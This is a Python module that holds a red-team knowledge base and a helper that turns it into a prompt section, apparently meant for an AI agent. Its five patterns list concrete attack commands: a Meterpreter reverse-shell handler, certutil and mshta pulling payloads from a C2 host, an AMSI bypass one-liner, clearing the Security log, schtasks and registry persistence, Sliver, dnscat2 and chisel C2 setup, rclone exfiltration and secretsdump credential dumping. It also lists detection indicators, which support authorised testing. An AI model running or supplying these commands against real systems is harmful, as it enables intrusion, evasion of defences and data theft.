"""Red team operations knowledge base.

Attack patterns for red team engagements:
1. Initial Access — phishing, watering hole, supply chain, exposed services
2. Execution & Persistence — LOLBins, scheduled tasks, registry, WMI
3. Defense Evasion — AMSI bypass, ETW patching, unhooking, process injection
4. Command & Control — DNS tunneling, domain fronting, covert channels
5. Objective Completion — data exfiltration, impact, ransomware simulation
"""

from __future__ import annotations

from dataclasses import dataclass, field
from enum import Enum
from typing import Any

import structlog

logger = structlog.get_logger()


class RedTeamPhase(str, Enum):
    INITIAL_ACCESS = "initial_access"
    EXECUTION_PERSIST = "execution_persist"
    DEFENSE_EVASION = "defense_evasion"
    COMMAND_CONTROL = "command_control"
    OBJECTIVE = "objective"


@dataclass
class RedTeamPattern:
    name: str = ""
    phase: RedTeamPhase = RedTeamPhase.INITIAL_ACCESS
    description: str = ""
    techniques: list[str] = field(default_factory=list)
    indicators: list[str] = field(default_factory=list)
    tools: list[str] = field(default_factory=list)
    commands: list[str] = field(default_factory=list)
    mitre_ids: list[str] = field(default_factory=list)
    severity: str = "high"

    def to_dict(self) -> dict[str, Any]:
        return {"name": self.name, "phase": self.phase.value, "severity": self.severity, "techniques": len(self.techniques)}


RED_TEAM_PATTERNS: list[RedTeamPattern] = [
    RedTeamPattern(
        name="Initial Access Techniques",
        phase=RedTeamPhase.INITIAL_ACCESS,
        description="Gaining first foothold: spear-phishing with macro payloads, watering hole via compromised sites, exploiting exposed services (VPN, RDP, Citrix), supply chain compromise, and valid credential abuse.",
        techniques=[
            "Spear-phishing with Office macro payload (VBA stomping)",
            "HTML smuggling to bypass email gateway",
            "Watering hole attack on industry-specific sites",
            "Exploit public-facing apps (CVE-based: VPN, Exchange, Citrix)",
            "Valid credential abuse from password spraying or credential dumps",
            "Supply chain compromise via trusted vendor access",
            "USB drop attack with HID payloads (Rubber Ducky)",
            "QR code phishing (quishing) to credential harvesting page",
        ],
        indicators=[
            "Email with macro-enabled attachment from unknown sender",
            "Outbound connection to newly registered domain",
            "VPN/RDP brute force attempts in authentication logs",
            "HTML file attachment with embedded JavaScript payload",
        ],
        tools=["gophish", "evilginx2", "modlishka", "social-engineer-toolkit"],
        commands=[
            "gophish --admin-url https://0.0.0.0:3333",
            "evilginx2 -p phishlets/ -debug",
            "msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; run'",
            "responder -I eth0 -wrf",
            "crackmapexec smb target_range -u users.txt -p passwords.txt --continue-on-success",
        ],
        mitre_ids=["T1566", "T1190", "T1078", "T1195", "T1189"],
        severity="critical",
    ),
    RedTeamPattern(
        name="Execution & Persistence",
        phase=RedTeamPhase.EXECUTION_PERSIST,
        description="Executing payloads and establishing persistence: LOLBins (certutil, mshta, regsvr32), scheduled tasks, registry run keys, WMI event subscriptions, DLL side-loading, and COM object hijacking.",
        techniques=[
            "LOLBin execution: certutil -urlcache -split -f <url> payload.exe",
            "MSHTA execution: mshta vbscript:Execute(code)",
            "Scheduled task persistence: schtasks /create with SYSTEM",
            "Registry run key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "WMI event subscription persistence (__EventFilter + __FilterToConsumerBinding)",
            "DLL side-loading via legitimate signed binary",
            "COM object hijacking for persistence",
            "Startup folder shortcut with hidden payload",
        ],
        indicators=[
            "certutil.exe downloading files from external URL",
            "New scheduled task created with SYSTEM privileges",
            "Registry run key modification for unknown binary",
            "WMI EventFilter creation in __FilterToConsumerBinding",
            "DLL loaded from unusual path by signed binary",
        ],
        tools=["impacket", "sliver", "covenant", "sharp-collection"],
        commands=[
            "schtasks /create /tn 'SystemUpdate' /tr 'C:\\payload.exe' /sc onlogon /ru SYSTEM",
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /d C:\\payload.exe",
            "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name='BotFilter'",
            "certutil -urlcache -split -f http://c2/payload.exe C:\\Windows\\Temp\\svc.exe",
            "mshta http://c2/payload.hta",
        ],
        mitre_ids=["T1053", "T1547", "T1546", "T1218", "T1574"],
        severity="high",
    ),
    RedTeamPattern(
        name="Defense Evasion",
        phase=RedTeamPhase.DEFENSE_EVASION,
        description="Bypassing security controls: AMSI bypass, ETW patching, EDR unhooking via direct syscalls, process injection (process hollowing, early bird APC), timestomping, and indicator removal.",
        techniques=[
            "AMSI bypass: patching AmsiScanBuffer in memory",
            "ETW patching: NtTraceEvent hook to blind EDR telemetry",
            "Direct syscalls (SysWhispers) to bypass ntdll hooks",
            "Process hollowing: create suspended process, map payload",
            "Early Bird APC injection into newly created thread",
            "PPID spoofing to appear as child of legitimate process",
            "Timestomping: modify file timestamps to blend in",
            "Event log tampering: clear Security/PowerShell logs",
        ],
        indicators=[
            "AmsiScanBuffer memory region modified",
            "Direct syscall instruction patterns (syscall/int 2e)",
            "Process with mismatched parent PID",
            "File with creation timestamp before OS install date",
            "Security event log cleared (Event ID 1102)",
        ],
        tools=["sharpunhooker", "syscallswow64", "donut", "reflective-dll"],
        commands=[
            "powershell -ep bypass -c '[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiInitFailed\",\"NonPublic,Static\").SetValue($null,$true)'",
            "donut -i payload.exe -o loader.bin -a 2 -f 1",
            "wevtutil cl Security",
            "timestomp C:\\payload.exe -m '01/01/2020 12:00:00'",
        ],
        mitre_ids=["T1562", "T1055", "T1070", "T1036", "T1134"],
        severity="critical",
    ),
    RedTeamPattern(
        name="Command & Control",
        phase=RedTeamPhase.COMMAND_CONTROL,
        description="Establishing covert C2 channels: DNS tunneling, domain fronting via CDN, HTTPS beacons with jitter, named pipe pivoting, and covert channels over allowed protocols.",
        techniques=[
            "DNS tunneling: encode data in DNS TXT/CNAME queries",
            "Domain fronting: use legitimate CDN (CloudFront, Azure) as proxy",
            "HTTPS beacon with jitter and sleep variation",
            "Named pipe pivoting for internal lateral C2",
            "Slack/Teams/Discord bot as C2 channel",
            "Websocket C2 over standard HTTPS port",
            "ICMP tunneling for data exfiltration",
            "Steganography: hide data in image/document metadata",
        ],
        indicators=[
            "High volume of DNS TXT queries to single domain",
            "HTTPS traffic to CDN with unusual SNI/Host mismatch",
            "Regular beacon pattern with slight timing jitter",
            "Named pipe connections between unrelated processes",
            "Outbound traffic to Slack/Discord API from server process",
        ],
        tools=["sliver", "cobalt-strike", "mythic", "havoc", "dnscat2"],
        commands=[
            "sliver > generate --mtls c2.example.com --os windows --arch amd64",
            "sliver > mtls --lhost 0.0.0.0 --lport 8888",
            "dnscat2 --dns server=c2dns.example.com",
            "chisel server -p 8080 --reverse",
            "chisel client c2:8080 R:socks",
        ],
        mitre_ids=["T1071", "T1090", "T1572", "T1573", "T1102"],
        severity="high",
    ),
    RedTeamPattern(
        name="Objective Completion",
        phase=RedTeamPhase.OBJECTIVE,
        description="Achieving engagement objectives: data identification and staging, exfiltration via approved channels, ransomware simulation (encrypt/decrypt demo), and business impact demonstration.",
        techniques=[
            "Data discovery: find sensitive files (PII, financials, IP)",
            "Data staging: compress and encrypt before exfiltration",
            "Exfiltration over HTTPS to cloud storage (S3, Azure Blob)",
            "Exfiltration over DNS (slow but stealthy)",
            "Ransomware simulation: encrypt test files with recoverable key",
            "Domain admin compromise demonstration",
            "Business email compromise simulation",
            "Proof of concept: demonstrate full kill chain",
        ],
        indicators=[
            "Large archive files created in temp directories",
            "Bulk file access to sensitive document shares",
            "Outbound transfer to cloud storage endpoints",
            "File extension changes indicating encryption",
            "Domain admin credentials used from unusual source",
        ],
        tools=["rclone", "megacmd", "7zip", "impacket"],
        commands=[
            "find /share -name '*.xlsx' -o -name '*.docx' -o -name '*.pdf' | head -100",
            "7z a -p'SimulationKey123' -mhe=on staged_data.7z /share/sensitive/",
            "rclone copy staged_data.7z remote:exfil-bucket/",
            "secretsdump.py domain/admin:password@dc01.target.local",
            "crackmapexec smb dc01 -u admin -p pass --shares",
        ],
        mitre_ids=["T1005", "T1074", "T1041", "T1486", "T1048"],
        severity="critical",
    ),
]


def build_red_team_prompt(focus_phase: RedTeamPhase | None = None, max_patterns: int = 5) -> str:
    lines = ["## Red Team Operations Knowledge\n"]
    patterns = RED_TEAM_PATTERNS
    if focus_phase:
        patterns = [p for p in patterns if p.phase == focus_phase]
    for pattern in patterns[:max_patterns]:
        lines.append(f"### {pattern.name} [{pattern.severity}]")
        lines.append(pattern.description)
        lines.append("\nTechniques:")
        for tech in pattern.techniques[:4]:
            lines.append(f"  - {tech}")
        lines.append("\nMITRE: " + ", ".join(pattern.mitre_ids[:5]))
        lines.append("\nCommands:")
        for cmd in pattern.commands[:3]:
            lines.append(f"  $ {cmd}")
        lines.append("")
    return "\n".join(lines)
